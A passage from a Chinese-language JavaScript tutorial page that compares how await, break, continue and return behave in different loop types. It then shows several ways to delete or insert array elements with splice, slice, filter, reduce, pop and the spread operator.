</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h3 id="_1、普通for-循环"><a href="#_1、普通for-循环" class="header-anchor">#</a> 1、普通for 循环</h3> <ul><li>✅ await​​: 支持</li> <li>✅ ​break​​: 支持，立即退出整个循环</li> <li>✅ ​continue​​: 支持，跳过当前迭代进入下一次</li> <li>✅ ​return​​: 只能在函数内使用，退出当前循环，并且会退出整个函数</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">normalFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 如果换成return，退出当前循环，并且会退出整个函数</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;last&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="_2、while-循环"><a href="#_2、while-循环" class="header-anchor">#</a> 2、while 循环</h3> <ul><li>✅ await​​: 支持</li> <li>✅ ​break​​: 支持，立即退出整个循环</li> <li>❌ ​continue​​: 不要使用，会陷入无尽循环</li> <li>✅ ​return​​: 只能在函数内使用，退出当前循环，并且会退出整个函数</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">whileFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token comment">// continue; // 不要使用，会陷入无尽循环</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 如果换成return，退出当前循环，并且会退出整个函数</span>
        <span class="token punctuation">}</span>
        i<span class="token operator">++</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;last&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="_3、foreach-循环"><a href="#_3、foreach-循环" class="header-anchor">#</a> 3、forEach 循环</h3> <ul><li>❌ await​​: 无效，不会等待异步完成</li> <li>❌ ​break​​: 不支持（会报错）</li> <li>❌ ​continue​​: 不支持（会报错）</li> <li>✅ ​return​​: 仅退出当前回调，不会退出函数</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">eachFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// await sleep(); 无效，不会等待异步完成</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// continue; // 不支持（会报错）</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// break; // 不支持（会报错）</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 仅退出当前回调，不会退出函数</span>
        <span class="token punctuation">}</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;last&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="_4、map-循环"><a href="#_4、map-循环" class="header-anchor">#</a> 4、map 循环</h3> <ul><li>❌ await​​: 无效，不会等待异步完成</li> <li>❌ ​break​​: 不支持（会报错）</li> <li>❌ ​continue​​: 不支持（会报错）</li> <li>​return​​: <strong>返回当前迭代结果，不会退出函数</strong></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">mapFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// await sleep(); 无效，不会等待异步完成</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// continue; // 不支持（会报错）</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// break; 不支持（会报错）</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 返回当前迭代结果，不会退出函数</span>
        <span class="token punctuation">}</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;last&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="_5、for-of-循环"><a href="#_5、for-of-循环" class="header-anchor">#</a> 5、for...of 循环</h3> <ul><li>✅ await​​: 支持</li> <li>✅ ​break​​: 支持，立即退出整个循环</li> <li>✅ ​continue​​: 支持，跳过当前迭代进入下一次</li> <li>✅ ​return​​: 只能在函数内使用，退出当前循环，并且会退出整个函数</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">forOfFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>i<span class="token punctuation">,</span> item<span class="token punctuation">]</span> <span class="token keyword">of</span> arr<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 如果换成return，退出当前循环，并且会退出整个函数</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;last&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h2 id="_4-数组高频操作总结"><a href="#_4-数组高频操作总结" class="header-anchor">#</a> 4. 数组高频操作总结</h2> <h3 id="高频使用的api"><a href="#高频使用的api" class="header-anchor">#</a> 高频使用的API</h3> <ul><li><p>array.splice(index, howmany, item1,.....,itemX)</p> <ul><li><code>howmany</code> 可选。规定应该删除多少元素。必须是数字，但可以是 &quot;0&quot;。</li> <li><code>item1, ..., itemX</code> 可选。要添加到数组的新元素</li> <li>返回的是含有被删除的元素的数组</li> <li><strong>这种方法会改变原始数组</strong>。</li></ul></li> <li><p>array.slice(start, end)</p> <ul><li><code>start</code> 可选。规定从何处开始选取。 slice(-2) 表示提取原数组中的倒数第二个元素到最后一个元素（包含最后一个元素）</li> <li><code>end</code> 可选。规定从何处结束选取。</li> <li>返回一个新的数组，包含从 start（包括该元素） 到 end （不包括该元素）</li> <li><strong>这种方法不会改变原始数组</strong>。</li></ul></li></ul> <h3 id="_1-数组指定下标-删除元素-的方法"><a href="#_1-数组指定下标-删除元素-的方法" class="header-anchor">#</a> 1.数组指定下标 删除元素 的方法</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>比如删除数组中第2个元素</p> <ul><li>（1）splice()（直接修改原数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从索引1开始删除1个元素</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（2）filter()（创建新数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> newArr <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> index <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 保留索引不为1的元素</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newArr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（3）扩展运算符 + slice()（创建新数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> newArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 拼接索引0-1和2之后的部分</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newArr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（4）reduce()（创建新数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> newArr <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">acc<span class="token punctuation">,</span> cur<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> acc<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 跳过索引1</span>
  <span class="token keyword">return</span> acc<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newArr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li>（5）手动遍历，创建新数组（适用于学习算法）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> newArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> newArr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 跳过索引1</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newArr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="_2-数组指定下标-添加元素-的方法"><a href="#_2-数组指定下标-添加元素-的方法" class="header-anchor">#</a> 2.数组指定下标 添加元素 的方法</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>比如在数组中第3个元素之后，添加99,100</p> <ul><li>（1）splice()（直接修改原数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 在第3个位置（索引2之后）插入</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 99, 100, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（2）使用展开运算符（ES6）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">...</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 99, 100, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="_3-数组删除最后一个元素方法"><a href="#_3-数组删除最后一个元素方法" class="header-anchor">#</a> 3.数组删除最后一个元素方法</h3> <ul><li>（1）使用 slice()</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> result <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从0开始到倒数第1个（不包含）</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（2）使用 pop()（会修改原数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
b<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 移除最后一个元素</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（3）设置 length 属性（会修改原数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
b<span class="token punctuation">.</span>length <span class="token operator">=</span> b<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 将长度减1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（4）使用 splice()（会修改原数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
b<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从倒数第1个位置开始删除1个元素</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>（5）使用 filter()（不修改原数组）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
